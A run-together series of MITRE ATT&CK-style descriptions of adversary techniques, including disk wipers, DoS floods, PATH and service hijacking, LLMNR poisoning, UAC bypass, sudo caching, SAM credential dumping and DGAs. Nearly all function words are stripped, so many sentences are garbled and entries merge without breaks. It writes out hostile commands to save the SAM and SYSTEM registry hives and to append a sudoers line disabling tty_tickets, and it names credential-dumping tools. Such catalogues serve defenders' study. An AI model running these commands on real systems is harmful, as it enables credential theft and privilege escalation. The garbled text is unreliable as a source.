To maximize impact target organization, malware designed destroying disk structures worm-like features propagate network leveraging techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017) Adversaries attempt denial service (DoS) sending high-volume network traffic target. DoS attack reduce availability functionality targeted system(s) network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s systems send high-volume network packets targeted service's network. network protocol flooding. Stateless protocols UDP ICMP commonly stateful protocols TCP well.

Botnets commonly conduct network flooding attacks networks services. botnets generate traffic systems spread global Internet. Adversaries resources build control botnet infrastructure rent time existing botnet conduct attack. worst distributed DoS (DDoS), systems generate flood send traffic produce volume saturate target network. circumstances, distinguishing DDoS traffic legitimate clients exceedingly difficult. Botnets high-profile DDoS flooding attacks, 2012 series incidents targeted major banks.(Citation: USNYAG IranianBotnet March 2016) Adversaries insert, delete, manipulate data rest manipulate external outcomes hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating stored data, adversaries attempt affect business process, organizational understanding, decision making. 

Stored data include variety file formats, Office files, databases, stored emails, custom file formats. type modification impact depends type data goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries execute malicious payloads hijacking environment variables load libraries. Adversaries program earlier entry list directories stored PATH environment variable, Windows execute searches sequentially PATH listing search binary called script command line.

The PATH environment variable list directories. methods executing program (namely cmd.exe command-line) rely solely PATH environment variable determine locations searched program path program given. directories listed PATH environment variable Windows directory, <code>%SystemRoot%\system32</code> <code>C:\Windows\system32</code>), program preceding directory named Windows program (such cmd, PowerShell, Python), executed command executed script command-line.

For example, <code>C:\example path</code> precedes </code>C:\Windows\system32</code> PATH environment variable, program named net.exe <code>C:\example path</code> called Windows "net" "net" executed command-line. Adversaries leverage SharePoint repository source valuable information. SharePoint adversary learn structure functionality internal network systems. example, list hold potential adversary SharePoint:

* Policies, procedures, standards
* Physical / logical network diagrams
* architecture diagrams
* Technical documentation
* Testing / development credentials
* / project schedules
* Source code snippets
* Links network shares internal resources
 Adversaries access volume bypass file access controls file monitoring. Windows programs direct access logical volumes. Programs direct access read write files drive analyzing file data structures. technique bypasses Windows file access controls file monitoring tools. (Citation: Hakobyan 2009)

Utilities, NinjaCopy, exist perform actions PowerShell. (Citation: Github PowerSploit Ninjacopy) Processes automatically execute specific binaries functionality perform actions. permissions file directory target binary, permissions binary itself, improperly set, target binary overwritten binary user-level permissions executed original process. original process thread running permissions level, replaced binary execute higher-level permissions, include SYSTEM.

Adversaries technique replace legitimate binaries malicious executing code permissions level. executing process set specific time event bootup) technique persistence.

### Services

Manipulation Windows service binaries variation technique. Adversaries replace legitimate service executable executable gain persistence privilege escalation account context service set execute (local/domain account, SYSTEM, LocalService, NetworkService). service started, user (if access available) means, restart service starts bootup, replaced executable original service executable.

### Executable Installers

Another variation technique performed advantage weakness common executable, self-extracting installers. installation process, common installers subdirectory <code>%TEMP%</code> directory unpack binaries DLLs, EXEs, payloads. installers create subdirectories files set permissions restrict write access, execution untrusted code subdirectories overwriting binaries installation process. behavior advantage [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038). installers require elevated privileges result privilege escalation executing adversary controlled code. behavior [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). examples weakness existing common installers reported software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer) Adversaries email rules hide inbound emails compromised user's mailbox. email clients users create inbox rules email functions, including moving emails folders, marking emails read, deleting emails. Rules created modified email clients external features <code>New-InboxRule</code> <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets Windows systems.(Citation: Inbox Rules)(Citation: MacOS Email Rules)(Citation: New-InboxRule)(Citation: Set-InboxRule)

Adversaries utilize email rules compromised user's mailbox delete emails noticeable folders. Adversaries hide security alerts, C2 communication, responses [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails compromised account.

Any user administrator organization (or adversary valid credentials) create rules automatically delete emails. rules abused impair/delay detection email content user defender. Malicious rules commonly filter emails based key (such <code>malware</code>, <code>suspicious</code>, <code>phish</code>, <code>hack</code>) message bodies subject lines. (Citation: Cloud App Security) adversary deface systems external organization attempt deliver messaging, intimidate, mislead organization users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) ultimately users distrust systems question/discredit system’s integrity. Externally-facing websites common victim defacement; targeted adversary hacktivist push political message spread propaganda.(Citation: FireEye Cyber Threats Media Industries)(Citation: Kevin Mandia Statement Senate Committee Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) catalyst trigger events, response actions organization government. Similarly, defacement setup, precursor, future attacks [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Defacement) Link-Local Multicast Resolution (LLMNR) NetBIOS Service (NBT-NS) Windows components serve alternate methods host identification. LLMNR based Domain (DNS) format hosts local link perform resolution hosts. NBT-NS identifies systems local network NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)

Adversaries spoof authoritative source resolution victim network responding LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic identity requested host, effectively poisoning service victims communicate adversary controlled system. requested host belongs resource requires identification/authentication, username NTLMv2 hash adversary controlled system. adversary collect hash wire tools monitor ports traffic [Network Sniffing](https://attack.mitre.org/techniques/T1040) crack hashes offline [Brute Force](https://attack.mitre.org/techniques/T1110) plaintext passwords. adversary access authentication path systems automated scans credentials attempt authenticate adversary controlled system, NTLMv2 hashes intercepted relayed access execute code target system. relay step happen conjunction poisoning independent it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)

Several tools exist poison services local networks NBNSpoof, Metasploit, [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder) Adversaries gather victim's IP addresses targeting. Public IP addresses allocated organizations block, range sequential addresses. assigned IP addresses include variety details, IP addresses use. IP addresses enable adversary derive details victim, organizational size, physical location(s), Internet service provider, where/how publicly-facing infrastructure hosted.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598). assigned IP addresses exposed adversaries online accessible data sets (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries launch denial service (DoS) attack targeting endpoint's operating (OS). system's OS responsible managing finite resources preventing entire overwhelmed excessive demands capacity. attacks exhaust actual resources system; attacks simply exhaust limits resources OS self-imposes.

Different achieve exist, including TCP state-exhaustion attacks SYN floods ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) SYN floods, excessive amounts SYN packets sent, 3-way TCP handshake completed. OS maximum concurrent TCP connections allow, exhaust ability receive requests TCP connections, preventing access TCP service server.(Citation: Cloudflare SynFlood)

ACK floods leverage stateful nature TCP protocol. flood ACK packets target. forces OS search table TCP connection established. ACK packets connections exist, OS search entire table confirm match exists. flood packets, computational requirements server sluggish unresponsive, eliminate rogue ACK packets. greatly reduces resources providing targeted service.(Citation: Corero SYN-ACKflood) Adversaries rootkits hide presence programs, files, network connections, services, drivers, components. Rootkits programs hide existence malware intercepting/hooking modifying operating API calls supply information. (Citation: Symantec Windows Rootkits) 

Rootkits rootkit enabling functionality reside user kernel level operating lower, include hypervisor, Master Boot Record, [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits Windows, Linux, Mac OS systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit) Adversaries gain persistence elevate privileges executing malicious content triggered PowerShell profiles. PowerShell profile  (<code>profile.ps1</code>) script runs [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts logon script customize user environments.

[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports profiles depending user host program. example, profiles [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs PowerShell console, PowerShell ISE Visual Studio Code. administrator configure profile applies users host programs local computer. (Citation: Profiles) 

Adversaries modify profiles include arbitrary commands, functions, modules, [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives gain persistence. time user [PowerShell](https://attack.mitre.org/techniques/T1059/001) session modified script executed <code>-NoProfile</code> flag launched. (Citation: ESET Turla PowerShell 2019) 

An adversary escalate privileges script PowerShell profile loaded executed account privileges, domain administrator. (Citation: Wits Shady PowerShell Profiles) Adversaries abuse implementations JavaScript execution. JavaScript (JS) platform-independent scripting language (compiled just-in-time runtime) commonly scripts webpages, JS executed runtime environments browser.(Citation: NodeJS)

JScript implementation scripting standard. JScript interpreted Windows Script engine integrated components Windows [Component Object Model](https://attack.mitre.org/techniques/T1559/001) Internet Explorer Application (HTA) pages.(Citation: JScrip 2018)(Citation: JScript 2007)(Citation: Windows Scripts)

JavaScript Automation (JXA) macOS scripting language based JavaScript, included Apple’s Scripting Architecture (OSA), introduced OSX 10.10. Apple’s OSA scripting capabilities control applications, interface operating system, bridge access rest Apple’s internal APIs. OSX 10.10, OSA supports languages, JXA [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts executed command utility <code>osascript</code>, compiled applications script files <code>osacompile</code>, compiled executed memory programs leveraging OSAKit Framework.(Citation: Apple Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA VSCode)

Adversaries abuse implementations JavaScript execute behaviors. Common include hosting malicious scripts websites [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) downloading executing script files secondary payloads. payloads text-based, common adversaries obfuscate content [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027). Adversaries gather victim's DNS targeting. DNS include variety details, including registered servers records outline addressing target’s subdomains, mail servers, hosts. DNS, MX, TXT, SPF records reveal party cloud SaaS providers, Office 365, Suite, Salesforce, Zendesk.(Citation: Sean Metcalf Twitter DNS Records)

Adversaries gather ways, querying collecting details [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS exposed adversaries online accessible data sets (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering reveal opportunities forms reconnaissance (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Websites/Domains](https://attack.mitre.org/techniques/T1593), [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). Systemd services establish persistence Linux system. systemd service manager commonly managing background daemon processes (also services) resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd default initialization (init) Linux distributions starting Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, replaces legacy init systems including SysVinit Upstart remaining compatible aforementioned init systems.

Systemd utilizes configuration files service units control services boot conditions. default, unit files stored <code>/etc/systemd/system</code> <code>/usr/lib/systemd/system</code> directories file extension <code>.service</code>. service unit file numerous directives execute commands. 

* ExecStart, ExecStartPre, ExecStartPost directives cover execution commands services started manually 'systemctl' start service set automatically start. 
* ExecReload directive covers service restarts. 
* ExecStop ExecStopPost directives cover service stopped manually 'systemctl'.

Adversaries systemd functionality establish persistent access victim systems creating modifying service unit files systemd execute malicious commands recurring intervals, boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)

While adversaries typically require root privileges create/modify service unit files <code>/etc/systemd/system</code> <code>/usr/lib/systemd/system</code> directories, privilege users create/modify service unit files directories <code>~/.config/systemd/user/</code> achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016) Adversaries leverage AuthorizationExecuteWithPrivileges API escalate privileges prompting user credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) purpose API application developers easy perform operations root privileges, application installation updating.  API validate program requesting root privileges reputable source maliciously modified. API deprecated, functions releases macOS. calling API, user prompted enter credentials checks origin integrity program made. program calling API load writable files modified perform malicious behavior elevated privileges.

Adversaries abuse AuthorizationExecuteWithPrivileges root privileges install malicious software victims install persistence mechanisms.(Citation: Death 1000 installers; broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) technique combined [Masquerading](https://attack.mitre.org/techniques/T1036) trick user granting escalated privileges malicious code.(Citation: Death 1000 installers; broken!)(Citation: Carbon Black Shlayer Feb 2019) technique modifying legitimate programs machine API.(Citation: Death 1000 installers; broken!) adversary leverage computer's peripheral devices microphones webcams) applications voice video services) capture audio recordings purpose listening sensitive conversations gather information.

Malware scripts interact devices API operating application capture audio. Audio files written disk exfiltrated later. Adversaries create modify system-level processes repeatedly execute malicious payloads persistence. operating systems boot up, start processes perform background functions. Windows Linux, processes referred services.(Citation: TechNet Services) macOS, launchd processes [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) [Launch Agent](https://attack.mitre.org/techniques/T1543/001) finish initialization load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) 

Adversaries install services, daemons, agents configured execute startup repeatable interval establish persistence. Similarly, adversaries modify existing services, daemons, agents achieve effect.  

Services, daemons, agents created administrator privileges executed root/SYSTEM privileges. Adversaries leverage functionality create modify processes escalate privileges.(Citation: OSX Malware Detection)   Adversaries leverage external-facing remote services initially access persist network. Remote services VPNs, Citrix, access mechanisms users connect internal enterprise network resources external locations. remote service gateways manage connections credential authentication services. Services [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) [VNC](https://attack.mitre.org/techniques/T1021/005) externally.(Citation: MacOS VNC software Remote Desktop)

Access [Valid Accounts](https://attack.mitre.org/techniques/T1078) service requirement, credential pharming obtaining credentials users compromising enterprise network.(Citation: Volexity Virtual Private Keylogging) Access remote services redundant persistent access mechanism operation.

Access gained exposed service doesn’t require authentication. containerized environments, include exposed Docker API, Kubernetes API server, kubelet, application Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware) adversaries employ sophisticated compromise components install malicious firmware execute adversary code operating main firmware BIOS. technique [System Firmware](https://attack.mitre.org/techniques/T1019) conducted components capability level integrity checking. Malicious device firmware provide persistent level access systems potential typical failures maintain access hard disk re-images, evade host software-based defenses integrity checks. Adversaries establish persistence executing malicious content triggered execution tainted binaries. Mach-O binaries series headers perform operations binary loaded. LC_LOAD_DYLIB header Mach-O binary tells macOS OS dynamic libraries (dylibs) load execution time. ad-hoc compiled binary adjustments rest fields dependencies.(Citation: Writing Bad Malware OSX) tools perform changes.

Adversaries modify Mach-O binary headers load execute malicious dylibs time binary executed. invalidate digital signatures binaries binary modified, remediated simply removing LC_CODE_SIGNATURE command binary signature isn’t checked load time.(Citation: Malware Persistence OS X) adversary steal application service session cookies gain access applications Internet services authenticated user credentials. applications services session cookies authentication token user authenticated website.

Cookies valid extended period time, application actively used. Cookies disk, process memory browser, network traffic remote systems. Additionally, applications targets machine store sensitive authentication cookies memory (e.g. apps authenticate cloud services). Session cookies bypasses multi-factor authentication protocols.(Citation: Pass Cookie)

There examples malware targeting cookies browsers local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) source frameworks Evilginx 2 Muraena gather session cookies malicious proxy (ex: [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) set adversary phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)

After adversary acquires valid cookie, perform [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique login application. Adversaries abuse task scheduling functionality container orchestration tools Kubernetes schedule deployment containers configured execute malicious code. Container orchestration jobs automated tasks specific time, cron jobs Linux system. Deployments type configured maintain quantity containers time, automating process maintaining persistence cluster.

In Kubernetes, CronJob schedule Job runs containers perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) adversary utilize CronJob schedule deployment Job executes malicious code nodes cluster.(Citation: Threat Matrix Kubernetes) Adversaries Domain Generation Algorithms (DGAs) dynamically identify destination domain command control traffic relying list static IP addresses domains. advantage harder defenders block, track, command control channel, thousands domains malware check instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)

DGAs form random “gibberish” strings (ex: istgmxdejdnxuyla.ru) construct domain names generating letter. Alternatively, DGAs employ unit concatenating letters (ex: cityjulydish.net). DGAs time-based, generating domain time period (hourly, daily, monthly, etc). incorporate seed predicting future domains difficult defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)

Adversaries DGAs purpose [Fallback Channels](https://attack.mitre.org/techniques/T1008). contact lost primary command control server malware employ DGA reestablishing command control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity) Adversaries abuse double extension filename masquerading true file type. file include secondary file type extension extension displayed (ex: <code>File.txt.exe</code> render views <code>File.txt</code>). However, extension true file type determines file executed. real file extension hidden operating file browser (ex: explorer.exe), software configured system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) 

Adversaries abuse double extensions attempt conceal dangerous file types payloads. common usage involves tricking user benign file type executable code. files pose email attachments adversary gain [Initial Access](https://attack.mitre.org/tactics/TA0001) user’s [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) [User Execution](https://attack.mitre.org/techniques/T1204). example, executable file attachment named <code>Evil.txt.exe</code> display <code>Evil.txt</code> user. user view benign file it, inadvertently executing hidden malware.(Citation: SOCPrime DoubleExtension)

Common file types, files (.txt, .doc, etc.) image files (.jpg, .gif, etc.) typically extension benign. Executable extensions commonly regarded dangerous, .exe, .lnk, .hta, .scr, extension true file type. Adversaries bypass UAC mechanisms elevate process privileges system. Windows User Account Control (UAC) program elevate privileges (tracked integrity levels ranging high) perform task administrator-level permissions, prompting user confirmation. impact user ranges denying operation enforcement allowing user perform action local administrators prompt allowing enter administrator password complete action.(Citation: TechNet UAC Works)

If UAC protection level set level, Windows programs elevate privileges execute elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects prompting user UAC notification box.(Citation: TechNet UAC)(Citation: MSDN Elevation) [Rundll32](https://attack.mitre.org/techniques/T1218/011) load crafted DLL loads auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object performs file operation protected directory typically require elevated access. Malicious software injected trusted process gain elevated privileges prompting user.(Citation: Davidson Windows)

Many methods discovered bypass UAC. Github readme UACME extensive list methods(Citation: Github UACMe) discovered implemented, comprehensive list bypasses. Additional bypass methods regularly discovered wild, as:

* <code>eventvwr.exe</code> auto-elevate execute binary script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass lateral movement techniques credentials account administrator privileges known, UAC single security mechanism, privilege integrity process running unknown remote systems default integrity.(Citation: SANS UAC Bypass) Adversaries actions hide deployment new, modification existing files obfuscate activities. Timestomping technique modifies timestamps file (the modify, access, create, change times), mimic files folder. done, example, files modified created adversary conspicuous forensic investigators file analysis tools. Timestomping file [Masquerading](https://attack.mitre.org/techniques/T1036) hide malware tools. (Citation: WindowsIR Anti-Forensic Techniques) Adversaries check Internet connectivity compromised systems. performed automated discovery accomplished numerous [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, requests websites.

Adversaries responses requests determine capable communicating C2 servers attempting connect them. identify routes, redirectors, proxy servers. Adversaries perform sudo caching sudoers file elevate privileges. Adversaries execute commands users spawn processes privileges.

Within Linux MacOS systems, sudo (sometimes referred "superuser do") users perform commands terminals elevated privileges control perform commands system. <code>sudo</code> command "allows administrator delegate authority users (or users) ability (or all) commands root user providing audit trail commands arguments."(Citation: sudo 2018) sudo administrator, configuration features <code>timestamp_timeout</code>, time minutes instances <code>sudo</code> re-prompt password. <code>sudo</code> ability cache credentials period time. Sudo creates (or touches) file <code>/var/db/sudo</code> timestamp sudo determine timeout. Additionally, <code>tty_tickets</code> variable treats tty (terminal session) isolation. that, example, sudo timeout tty affect tty (you type password again).

The sudoers file, <code>/etc/sudoers</code>, describes users commands terminals. describes commands users users groups. principle privilege users running lowest permissions time elevate users permissions needed, typically prompting password. However, sudoers file prompt users passwords <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges required edit file though.

Adversaries abuse poor configurations mechanisms escalate privileges user's password. example, <code>/var/db/sudo</code>'s timestamp monitored falls <code>timestamp_timeout</code> range. does, malware execute sudo commands supply user's password. Additional, <code>tty_tickets</code> disabled, adversaries tty user.

In wild, malware disabled <code>tty_tickets</code> scripting easier issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) change reflected, malware issued <code>killall Terminal</code>. macOS Sierra, sudoers file <code>tty_tickets</code> enabled default. adversary compress encrypt data collected prior exfiltration custom method. Adversaries choose custom archival methods, encryption XOR stream ciphers implemented external library utility references. Custom implementations well-known compression algorithms used.(Citation: ESET Sednit 2) adversary attempt modify cloud account's compute service infrastructure evade defenses. modification compute service infrastructure include creation, deletion, modification components compute instances, virtual machines, snapshots.

Permissions gained modification infrastructure components bypass restrictions prevent access existing infrastructure. Modifying infrastructure components adversary evade detection remove evidence presence.(Citation: Mandiant M-Trends 2020) Adversaries attempt permission settings. adversaries determine user accounts available, membership users groups, users elevated permissions. Adversaries target user email collect sensitive information. Emails sensitive data, including trade secrets personal information, prove valuable adversaries. Adversaries collect email mail servers clients.  Adversaries attempt extract credential material Security Account Manager (SAM) database in-memory techniques Windows Registry SAM database stored. SAM database file local accounts host, typically <code>net user</code> command. Enumerating SAM database requires level access.

A tools retrieve SAM file in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, SAM extracted Registry Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 process SAM database locally retrieve hashes.(Citation: GitHub Creddump7)

Notes: 

* RID 500 account local, built-in administrator.
* RID 501 guest account.
* User accounts start RID 1,000+.
 Adversaries search public WHOIS data victims targeting. WHOIS data stored regional Internet registries (RIR) responsible allocating assigning Internet resources domain names. query WHOIS servers registered domain, assigned IP blocks, contact information, DNS nameservers.(Citation: WHOIS)

Adversaries search WHOIS data gather actionable information. Threat actors online resources command-line utilities pillage WHOIS data potential victims. sources reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries modify firmware persist systems.The BIOS (Basic Input/Output System) Unified Extensible Firmware Interface (UEFI) Extensible Firmware Interface (EFI) examples firmware operate software interface operating hardware computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: UEFI)

System firmware BIOS (U)EFI underly functionality modified adversary perform assist malicious activity. Capabilities exist overwrite firmware, sophisticated adversaries install malicious firmware updates persistence difficult detect. Adversaries search websites owned victim targeting. Victim-owned websites variety details, including names departments/divisions, physical locations, data key employees names, roles, contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). sites details highlighting business operations relationships.(Citation: Comparitech Leak)

Adversaries search victim-owned websites gather actionable information. sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) [Phishing](https://attack.mitre.org/techniques/T1566)). Adversaries attempt cloud permission settings. knowledge cloud permission adversaries determine roles users environment, users group.

With authenticated access tools permissions groups. <code>Get-MsolRole</code> PowerShell cmdlet roles permissions Exchange Office 365 accounts (Citation: Msolrole)(Citation: GitHub Raindance).

Azure CLI (AZ CLI) Google Cloud Identity Provider API provide interfaces permissions groups. command <code>az user get-member-groups</code> list user account Azure API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists resources user Google.(Citation: CLI)(Citation: Black Hills Red Teaming Azure, 2018)(Citation: Google Cloud Identity API Documentation)

Adversaries attempt list ACLs objects determine owner accounts access object, example, AWS <code>GetBucketAcl</code> API (Citation: AWS Bucket ACL). adversary target accounts permissions object leverage accounts compromised access object. Adversaries execute malicious payloads hijacking Registry entries services. Adversaries flaws permissions Registry services redirect originally executable control, launch code service starts. Windows stores local service configuration Registry <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. stored service's Registry manipulated modify service's execution parameters tools service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), [Reg](https://attack.mitre.org/software/S0075). Access Registry controlled access control lists user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

If permissions users properly set access Registry service, adversaries change service's binPath/ImagePath executable control. service starts restarted, adversary-controlled program execute, allowing adversary establish persistence privilege escalation account context service set execute (local/domain account, SYSTEM, LocalService, NetworkService).

Adversaries alter Registry service’s Registry tree. example, <code>FailureCommand</code> key changed service executed elevated context anytime service fails intentionally corrupted.(Citation: Kansa Service collectors)(Citation: Tweet Registry Perms Weakness)

The <code>Performance</code> key driver service's performance DLL names exported functions DLL.(Citation: microsoft_services_registry_tree) <code>Performance</code> key adversary-controlled user <code>Create Subkey</code> permission, adversaries create <code>Performance</code> key service’s Registry tree malicious DLL.(Citation: insecure_reg_perms)

Adversaries add <code>Parameters</code> key, stores driver-specific data, custom subkeys malicious services establish persistence enable malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, adversaries launch malicious services svchost.exe, service’s file identified <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll</code>.(Citation: malware_hides_service) Adversaries search DNS data victims targeting. DNS include variety details, including registered servers records outline addressing target’s subdomains, mail servers, hosts.

Adversaries search DNS data gather actionable information. Threat actors query nameservers target organization directly, search centralized repositories logged DNS query responses (known passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries seek target DNS misconfigurations/leaks reveal internal networks. sources reveal opportunities forms reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries target resource intensive features applications denial service (DoS), denying availability applications. example, specific features applications highly resource intensive. Repeated requests features exhaust resources deny access application server itself.(Citation: Arbor AnnualDoSreport Jan 2018) boot process, macOS executes <code>source /etc/rc.common</code>, script utility functions. file defines routines processing command-line arguments gathering settings, recommended include start Startup Item Scripts (Citation: Startup Items). macOS OS X, deprecated technique favor launch agents launch daemons, used.

Adversaries rc.common file hide code persistence execute reboot root user (Citation: Methods Mac Malware Persistence). Adversaries manipulate software dependencies development tools prior receipt final consumer purpose data compromise. Applications depend external software function properly. Popular source projects dependencies applications targeted add malicious code users dependency.(Citation: Trendmicro NPM Compromise)  

Targeting specific desired victim set distributed broad set consumers additional tactics specific victims.  Adversaries steal SSL/TLS certificates targeting. SSL/TLS certificates designed instill trust. include key, owner's identity, digital signature entity verified certificate's contents correct. signature valid, person examining certificate trusts signer, key communicate owner.

Adversaries purchase steal SSL/TLS certificates operations, encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) certificate trusted root trust [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). purchase digital certificates organization stolen compromised entity adversary validate certificate provider entity. Adversaries steal certificate materials compromised third-party, including certificate authorities.(Citation: DiginotarCompromise) Adversaries register hijack domains purchase SSL/TLS certificate for.

Certificate authorities exist adversaries acquire SSL/TLS certificates, domain validation certificates, free.(Citation: Encrypt FAQ)

After obtaining digital certificate, adversary install certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) infrastructure control. Adversaries set Domain (DNS) servers targeting. post-compromise activity, adversaries utilize DNS traffic tasks, including Command Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). hijacking existing DNS servers, adversaries opt configure DNS servers support operations.

